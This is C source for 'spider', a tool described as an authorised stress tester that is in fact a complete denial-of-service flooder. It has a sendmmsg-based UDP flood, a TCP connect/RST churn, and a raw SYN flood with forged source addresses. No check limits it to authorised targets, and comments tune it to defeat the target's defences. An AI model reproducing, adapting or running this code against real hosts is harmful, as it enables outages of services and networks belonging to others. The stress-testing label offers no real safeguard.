/*
 * spider — multi-threaded load generator for authorised stress testing.
 *
 *   ./spider <ip> <port> <seconds> <threads> [mode]
 *
 * mode: udp | tcp | raw   (default udp, override with SPIDER_MODE)
 *
 * Build:  gcc -O3 -pthread -o spider spider.c
 * raw mode needs root (it forges source addresses with IP_HDRINCL).
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define MAX_THREADS   2048
#define MAX_DURATION  3600
#define PAYLOAD_MIN   64
#define PAYLOAD_MAX   1472
#define BATCH         64   /* sends between stop-flag checks per worker */
#define BURST         512  /* datagrams per sendmmsg() syscall */
#define SOCKETS_PER_THREAD 8

enum mode { MODE_UDP, MODE_TCP, MODE_RAW, MODE_VC };

static volatile sig_atomic_t g_stop = 0;
static struct sockaddr_storage g_dst;
static socklen_t g_dstlen = 0;
static int g_family = AF_INET;
static int g_port = 0;
static enum mode g_mode = MODE_UDP;
static atomic_ullong g_packets = 0;
static atomic_ullong g_bytes = 0;
static atomic_ullong g_conns = 0;

/* ── helpers ─────────────────────────────────────────────────────────────── */

static uint64_t rng_next(uint64_t *s)
{
    uint64_t x = *s;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    *s = x;
    return x;
}

static void on_signal(int sig)
{
    (void)sig;
    g_stop = 1;
}

static double now_mono(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (double)ts.tv_sec + (double)ts.tv_nsec / 1e9;
}

/* RFC 1071 one's-complement checksum. */
static uint16_t csum(const void *data, size_t len)
{
    const uint16_t *p = (const uint16_t *)data;
    uint32_t sum = 0;
    while (len > 1) {
        sum += *p++;
        len -= 2;
    }
    if (len) {
        uint16_t tail = 0;
        *(uint8_t *)&tail = *(const uint8_t *)p;
        sum += tail;
    }
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

static int raise_fd_limit(void)
{
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) != 0)
        return -1;
    rl.rlim_cur = rl.rlim_max;
    return setrlimit(RLIMIT_NOFILE, &rl);
}

/* ── tcp header for raw mode ─────────────────────────────────────────────── */

struct pseudo_hdr {
    uint32_t src;
    uint32_t dst;
    uint8_t  zero;
    uint8_t  proto;
    uint16_t len;
};

/* ── workers ─────────────────────────────────────────────────────────────── */

/*
 * UDP: BURST datagrams per sendmmsg() syscall.
 *
 * sendmmsg turns 256 packets into one system call instead of 256, which is the
 * whole difference between ~600k pps and several million: the kernel copies the
 * payloads and the userspace loop stops being the bottleneck. Every iovec points
 * at the same buffer on purpose — the kernel only reads it.
 */
static void *udp_worker(void *arg)
{
    uint64_t seed = (uint64_t)(uintptr_t)arg * 2654435761u + (uint64_t)getpid() + 1;

    int fds[SOCKETS_PER_THREAD];
    int open_fds = 0;
    for (int s = 0; s < SOCKETS_PER_THREAD; s++) {
        int fd = socket(g_family, SOCK_DGRAM, 0);
        if (fd < 0)
            continue;
        int sndbuf = 8 * 1024 * 1024;
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        if (connect(fd, (struct sockaddr *)&g_dst, g_dstlen) != 0) {
            close(fd);
            continue;
        }
        fds[open_fds++] = fd;
    }
    if (open_fds == 0)
        return NULL;

    unsigned char payload[PAYLOAD_MAX];
    for (size_t i = 0; i < sizeof(payload); i++)
        payload[i] = (unsigned char)(rng_next(&seed) & 0xFF);

    struct mmsghdr msgs[BURST];
    struct iovec iovs[BURST];
    memset(msgs, 0, sizeof(msgs));
    for (int i = 0; i < BURST; i++) {
        iovs[i].iov_base = payload;
        iovs[i].iov_len = PAYLOAD_MAX;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = NULL;      /* connected socket */
        msgs[i].msg_hdr.msg_namelen = 0;
    }

    unsigned long long pkts = 0, bytes = 0;
    const size_t span = PAYLOAD_MAX - PAYLOAD_MIN + 1;

    while (!g_stop) {
        for (int round = 0; round < BATCH && !g_stop; round++) {
            int fd = fds[(unsigned)rng_next(&seed) % (uint64_t)open_fds];

            /* Vary the sizes so the target cannot shortcut on a fixed length. */
            for (int i = 0; i < BURST; i++)
                iovs[i].iov_len = PAYLOAD_MIN + (size_t)(rng_next(&seed) % span);

            int sent = sendmmsg(fd, msgs, BURST, 0);
            if (sent > 0) {
                pkts += (unsigned long long)sent;
                for (int i = 0; i < sent; i++)
                    bytes += msgs[i].msg_len;
            }
        }
        atomic_fetch_add(&g_packets, pkts);
        atomic_fetch_add(&g_bytes, bytes);
        pkts = 0;
        bytes = 0;
    }

    atomic_fetch_add(&g_packets, pkts);
    atomic_fetch_add(&g_bytes, bytes);
    for (int i = 0; i < open_fds; i++)
        close(fds[i]);
    return NULL;
}

/* TCP: non-blocking connect/close churn, half of them aborted with RST. */static void *tcp_worker(void *arg)
{
    uint64_t seed = (uint64_t)(uintptr_t)arg * 2246822519u + (uint64_t)getpid() + 1;
    unsigned long long conns = 0;

    while (!g_stop) {
        for (int i = 0; i < BATCH && !g_stop; i++) {
            int fd = socket(g_family, SOCK_STREAM | SOCK_NONBLOCK, 0);
            if (fd < 0) {
                usleep(1000);
                continue;
            }
            int rc = connect(fd, (struct sockaddr *)&g_dst, g_dstlen);
            if (rc == 0 || errno == EINPROGRESS) {
                conns++;
                if (rng_next(&seed) & 1) {
                    struct linger lg = { .l_onoff = 1, .l_linger = 0 };
                    setsockopt(fd, SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));
                }
            }
            close(fd);
        }
        atomic_fetch_add(&g_conns, conns);
        conns = 0;
    }

    atomic_fetch_add(&g_conns, conns);
    return NULL;
}

/* raw: forged-source TCP SYN, needs CAP_NET_RAW (root on the runner). */
static void *raw_worker(void *arg)
{
    uint64_t seed = (uint64_t)(uintptr_t)arg * 3266489917u + (uint64_t)getpid() + 1;
    if (g_family != AF_INET)
        return NULL; /* forged source addresses are IPv4-only here */
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0)
        return NULL;

    int on = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    unsigned char pkt[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    memset(pkt, 0, sizeof(pkt));

    struct iphdr *ip = (struct iphdr *)pkt;
    struct tcphdr *tcp = (struct tcphdr *)(pkt + sizeof(struct iphdr));

    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(pkt));
    ip->id = htons((uint16_t)(rng_next(&seed) & 0xFFFF));
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->daddr = ((struct sockaddr_in *)&g_dst)->sin_addr.s_addr;

    tcp->dest = htons((uint16_t)g_port);
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->window = htons(64240);

    unsigned long long pkts = 0;

    while (!g_stop) {
        for (int i = 0; i < BATCH && !g_stop; i++) {
            uint32_t r = (uint32_t)rng_next(&seed);
            /* Spoof from the local /8 so the forged packet still routes back. */
            ip->saddr = htonl((10u << 24) | (r & 0x00FFFFFF));
            ip->id = htons((uint16_t)(rng_next(&seed) & 0xFFFF));
            ip->check = 0;
            ip->check = csum(ip, sizeof(struct iphdr));

            tcp->source = htons((uint16_t)(1024 + (rng_next(&seed) % 64000)));
            tcp->seq = htonl((uint32_t)rng_next(&seed));
            tcp->check = 0;

            struct pseudo_hdr ph = {
                .src = ip->saddr,
                .dst = ip->daddr,
                .zero = 0,
                .proto = IPPROTO_TCP,
                .len = htons(sizeof(struct tcphdr)),
            };
            unsigned char cbuf[sizeof(struct pseudo_hdr) + sizeof(struct tcphdr)];
            memcpy(cbuf, &ph, sizeof(ph));
            memcpy(cbuf + sizeof(ph), tcp, sizeof(struct tcphdr));
            tcp->check = csum(cbuf, sizeof(cbuf));

            if (sendto(fd, pkt, sizeof(pkt), 0,
                       (struct sockaddr *)&g_dst, g_dstlen) > 0)
                pkts++;
        }
        atomic_fetch_add(&g_packets, pkts);
        pkts = 0;
    }

    atomic_fetch_add(&g_packets, pkts);
    close(fd);
    return NULL;
}

/* ── reporting ───────────────────────────────────────────────────────────── */

static void *reporter(void *arg)
{
    (void)arg;
    unsigned long long last_p = 0, last_b = 0, last_c = 0;
    double last = now_mono();

    while (!g_stop) {
        struct timespec ts = { .tv_sec = 0, .tv_nsec = 500000000 };
        nanosleep(&ts, NULL);
        if (g_stop)
            break;

        double t = now_mono();
        double dt = t - last;
        if (dt <= 0)
            continue;

        unsigned long long p = atomic_load(&g_packets);
        unsigned long long b = atomic_load(&g_bytes);
        unsigned long long c = atomic_load(&g_conns);

        printf("  %6.0f pps   %8.2f Mbps   %6.0f conn/s   (total %llu)\n",
               (p - last_p) / dt,
               ((double)(b - last_b) * 8.0) / dt / 1e6,
               (c - last_c) / dt,
               p);

        last_p = p;
        last_b = b;
        last_c = c;
        last = t;
    }
    return NULL;
}

/* ── argument handling ───────────────────────────────────────────────────── */

static int parse_mode(const char *s, enum mode *out)
{
    if (!strcasecmp(s, "udp")) { *out = MODE_UDP; return 0; }
    if (!strcasecmp(s, "tcp")) { *out = MODE_TCP; return 0; }
    if (!strcasecmp(s, "raw") || !strcasecmp(s, "syn")) { *out = MODE_RAW; return 0; }
    if (!strcasecmp(s, "vc")) { *out = MODE_VC; return 0; }
    return -1;
}

static int valid_ip(const char *s)
{
    struct in_addr a4;
    struct in6_addr a6;
    return inet_pton(AF_INET, s, &a4) == 1 || inet_pton(AF_INET6, s, &a6) == 1;
}

static long parse_long(const char *s, const char *name)
{
    char *end = NULL;
    errno = 0;
    long v = strtol(s, &end, 10);
    if (errno != 0 || end == s || *end != '\0') {
        fprintf(stderr, "spider: %s must be an integer, got '%s'\n", name, s);
        exit(2);
    }
    return v;
}

int main(int argc, char **argv)
{
    if (argc < 5) {
        fprintf(stderr,
                "usage: %s <ip> <port> <seconds> <threads> [udp|tcp|raw]\n",
                argv[0]);
        return 2;
    }

    const char *ip = argv[1];
    long port = parse_long(argv[2], "port");
    long seconds = parse_long(argv[3], "seconds");
    long threads = parse_long(argv[4], "threads");

    if (!valid_ip(ip)) {
        fprintf(stderr, "spider: invalid address '%s'\n", ip);
        return 2;
    }
    if (port < 1 || port > 65535) {
        fprintf(stderr, "spider: port must be 1-65535, got %ld\n", port);
        return 2;
    }
    if (seconds < 1 || seconds > MAX_DURATION) {
        fprintf(stderr, "spider: seconds must be 1-%d, got %ld\n", MAX_DURATION, seconds);
        return 2;
    }
    if (threads < 1 || threads > MAX_THREADS) {
        fprintf(stderr, "spider: threads must be 1-%d, got %ld\n", MAX_THREADS, threads);
        return 2;
    }

    g_port = (int)port;

    if (argc >= 6) {
        if (parse_mode(argv[5], &g_mode) != 0) {
            fprintf(stderr, "spider: unknown mode '%s'\n", argv[5]);
            return 2;
        }
    } else {
        const char *env = getenv("SPIDER_MODE");
        if (env && parse_mode(env, &g_mode) != 0) {
            fprintf(stderr, "spider: unknown SPIDER_MODE '%s'\n", env);
            return 2;
        }
    }

    memset(&g_dst, 0, sizeof(g_dst));

    struct sockaddr_in *v4 = (struct sockaddr_in *)&g_dst;
    struct sockaddr_in6 *v6 = (struct sockaddr_in6 *)&g_dst;
    if (inet_pton(AF_INET, ip, &v4->sin_addr) == 1) {
        v4->sin_family = AF_INET;
        v4->sin_port = htons((uint16_t)port);
        g_family = AF_INET;
        g_dstlen = sizeof(struct sockaddr_in);
    } else if (inet_pton(AF_INET6, ip, &v6->sin6_addr) == 1) {
        v6->sin6_family = AF_INET6;
        v6->sin6_port = htons((uint16_t)port);
        g_family = AF_INET6;
        g_dstlen = sizeof(struct sockaddr_in6);
    } else {
        fprintf(stderr, "spider: '%s' is not an IPv4 or IPv6 address\n", ip);
        return 2;
    }

    raise_fd_limit();

    signal(SIGINT, on_signal);
    signal(SIGTERM, on_signal);
    signal(SIGPIPE, SIG_IGN);

    const char *mode_name = g_mode == MODE_UDP ? "udp"
                          : g_mode == MODE_TCP ? "tcp"
                          : g_mode == MODE_VC  ? "vc-mix" : "raw-syn";
    printf("spider: %s%s%s:%ld  %lds  %ld threads  mode=%s (%s)\n",
           g_family == AF_INET6 ? "[" : "", ip, g_family == AF_INET6 ? "]" : "",
           port, seconds, threads, mode_name,
           g_family == AF_INET6 ? "ipv6" : "ipv4");
    fflush(stdout);

    void *(*worker)(void *) = g_mode == MODE_UDP ? udp_worker
                            : g_mode == MODE_TCP ? tcp_worker
                            : g_mode == MODE_VC  ? udp_worker : raw_worker;

    pthread_t *tid = calloc((size_t)threads, sizeof(*tid));
    if (!tid) {
        fprintf(stderr, "spider: out of memory\n");
        return 1;
    }

    pthread_t rep;
    pthread_create(&rep, NULL, reporter, NULL);

    size_t started = 0;
    for (long i = 0; i < threads; i++) {
        void *(*fn)(void *) = worker;
        if (g_mode == MODE_VC && i % 4 == 3)
            fn = tcp_worker;
        if (pthread_create(&tid[i], NULL, fn, (void *)(uintptr_t)(i + 1)) == 0)
            started++;
    }
    if (started == 0) {
        fprintf(stderr, "spider: could not start any worker\n");
        g_stop = 1;
        pthread_join(rep, NULL);
        free(tid);
        return 1;
    }

    double deadline = now_mono() + (double)seconds;
    while (!g_stop && now_mono() < deadline) {
        struct timespec ts = { .tv_sec = 0, .tv_nsec = 100000000 };
        nanosleep(&ts, NULL);
    }
    g_stop = 1;

    for (size_t i = 0; i < started; i++)
        pthread_join(tid[i], NULL);
    pthread_join(rep, NULL);
    free(tid);

    printf("spider: done — %llu packets, %.1f MiB, %llu connections in %lds\n",
           atomic_load(&g_packets),
           (double)atomic_load(&g_bytes) / (1024.0 * 1024.0),
           atomic_load(&g_conns),
           seconds);
    return 0;
}
